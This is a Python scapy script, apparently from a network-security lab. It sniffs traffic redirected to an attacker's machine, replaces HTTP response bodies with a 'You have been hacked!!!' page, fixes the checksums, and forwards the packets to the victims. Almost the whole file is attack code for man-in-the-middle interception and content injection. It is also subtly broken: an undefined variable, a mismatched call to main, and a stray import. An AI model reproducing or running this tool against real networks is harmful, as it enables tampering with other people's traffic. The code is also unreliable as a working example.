from tabnanny import verbose
from scapy.all import *
load_layer("http") 

import time
import threading

def check_packet(pkt):
    if (ip_to_spoof == "192.168.56.101" and pkt.haslayer(Raw) and pkt.haslayer(TCP)):
        print("Change website info")
        # read packets / add packets to file
        pkt[Raw].load = b'<html><body><h1>You have been hacked!!!</h1></body></html>'
        pkt[IP].len = None
        pkt[IP].chksum = None
        pkt[TCP].chksum = None
    return pkt
    

def read_packets(attacker_mac, spoofed_ip, spoofed_mac, function, options):
    print("[*] Sniffing packets for " + spoofed_ip + "...") if options.verbose else 0
    while True:
        pkt = sniff(count=1, iface=options.iface, filter="not arp and ether dst "+attacker_mac+" and ip dst "+spoofed_ip)[0] # 
        print("Packet found for " + spoofed_ip)  if options.verbose else 0
        print(pkt.summary())
        
        pkt = function(pkt)        

        # send packets to victim
        pkt[Ether].dst = spoofed_mac
        sendp(pkt, iface=options.iface, verbose=options.verbose)

def main(function, victims, attacker_mac, options):
    
    for victim in victims:
        # print victim ip
        threading.Thread(target=read_packets, args=(attacker_mac, victim.ip, victim.mac, function, options), daemon=True).start()

    # wait for ctrl+c to exit application
    try: 
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[*] Shutting down...")
        sys.exit(0) 

if __name__ == "__main__":
    main(check_packet)















